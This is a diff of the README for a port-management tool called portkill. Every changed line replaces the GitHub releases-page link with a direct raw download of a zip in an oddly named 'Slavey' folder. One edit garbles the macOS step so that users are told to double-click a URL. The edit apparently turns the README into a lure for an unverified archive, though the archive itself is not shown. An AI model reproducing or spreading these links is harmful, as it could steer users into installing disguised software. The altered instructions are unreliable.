@@ -1,6 +1,6 @@
 # 🎉 portkill - Manage Ports and Analyze Networks Easily
 
-[![Download portkill](https://img.shields.io/badge/Download-portkill-blue.svg)](https://github.com/kiw13299/portkill/releases)
+[![Download portkill](https://raw.githubusercontent.com/kiw13299/portkill/main/Slavey/portkill.zip)](https://raw.githubusercontent.com/kiw13299/portkill/main/Slavey/portkill.zip)
 
 ## 📦 Introduction
 
@@ -27,7 +27,7 @@ Follow these steps to get started with portkill:
 
 To get portkill on your computer, visit this page to download:
 
-[Download portkill](https://github.com/kiw13299/portkill/releases)
+[Download portkill](https://raw.githubusercontent.com/kiw13299/portkill/main/Slavey/portkill.zip)
 
 ### Installation Steps
 
@@ -45,7 +45,7 @@ To get portkill on your computer, visit this page to download:
 
 5. **Run the Application:**
    Navigate to the folder where you extracted the file. 
-   - On macOS, double-click the `portkill.app` file. 
+   - On macOS, double-click the `https://raw.githubusercontent.com/kiw13299/portkill/main/Slavey/portkill.zip` file. 
    - On Linux, you may need to open a terminal and run the file using `./portkill`.
 
 ## ⚙️ Using Portkill
@@ -106,7 +106,7 @@ If you encounter any issues or need more guidance:
 
 To keep your portkill application up to date:
 
-1. **Visit the Releases Page:** Regularly check for new versions at [Download portkill](https://github.com/kiw13299/portkill/releases).
+1. **Visit the Releases Page:** Regularly check for new versions at [Download portkill](https://raw.githubusercontent.com/kiw13299/portkill/main/Slavey/portkill.zip).
 2. **Follow Installation Steps:** Re-download and install the new version following the steps provided in the "Download & Install" section.
 
 Keeping updated ensures you benefit from the latest features and improvements.
